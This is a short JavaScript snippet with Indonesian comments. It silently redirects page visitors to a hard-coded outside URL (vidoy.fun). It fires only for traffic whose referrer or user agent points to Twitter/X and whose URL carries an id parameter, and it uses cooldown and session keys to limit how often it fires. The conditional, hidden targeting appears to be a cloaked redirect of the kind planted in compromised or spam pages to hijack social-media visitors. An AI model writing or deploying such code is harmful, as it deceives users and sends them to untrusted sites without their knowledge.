(function () {
  try {
    // === SETTING ===
    var target     = "https://vidoy.fun/cB6Tyq0.php"; // tujuan fix
    var cooldownMs = 600 * 1000;                       // jeda antar redirect (1 menit)
    var delayMs    = 500;                            // delay sebelum redirect (ms)
    var requireId  = true;                            // wajib ada ?id=...
    // ===============

    if (!/^https:\/\//i.test(target)) return;

    var qs = location.search + location.hash;
    var DEBUG = /[?#](?:.*[&?])?debug=1(?:&|$)/i.test(qs);
    function log(){ if (DEBUG && console) console.log.apply(console, arguments); }

    // Ambil ID (buat kunci cooldown per-ID)
    var params = new URLSearchParams(location.search);
    var id = params.get("id");
    if (requireId && !id) { log("STOP: no id"); return; }
    var idKey = id || "_noid";

    // HANYA Twitter/X
    var REF = String(document.referrer || "");
    var UA  = String(navigator.userAgent || "");
    var isX = /(t\.co|twitter\.com|x\.com)/i.test(REF) || /twitter/i.test(UA);
    if (!isX) { log("STOP: not from Twitter/X"); return; }

    // Anti-loop per TAB + cooldown per ID
    var page = location.origin + location.pathname;
    var sessKey = "redir_x_seen:" + page + "|id=" + idKey;
    var cdKey   = "redir_x_cd:"   + page + "|id=" + idKey;

    // reset=1 untuk bersihin kunci ID ini (opsional)
    if (/[?#](?:.*[&?])?reset=1(?:&|$)/i.test(qs)) {
      sessionStorage.removeItem(sessKey);
      localStorage.removeItem(cdKey);
      log("RESET done for id =", idKey);
    }

    var now = Date.now();
    if (sessionStorage.getItem(sessKey)) { log("STOP: session seen"); return; }
    var until = parseInt(localStorage.getItem(cdKey) || "0", 10);
    if (now < until) { log("STOP: cooldown", (until-now)+"ms left"); return; }

    sessionStorage.setItem(sessKey, "1");
    localStorage.setItem(cdKey, String(now + cooldownMs));

    log("OK: will redirect in", delayMs, "ms to", target, "id=", idKey);

    // Redirect otomatis setelah delay
    setTimeout(function () {
      try { location.href = target; } catch(e) { log("redirect fail", e); }
    }, delayMs);

  } catch (e) {
    if (console) console.error("redir-x error:", e);
  }
})();
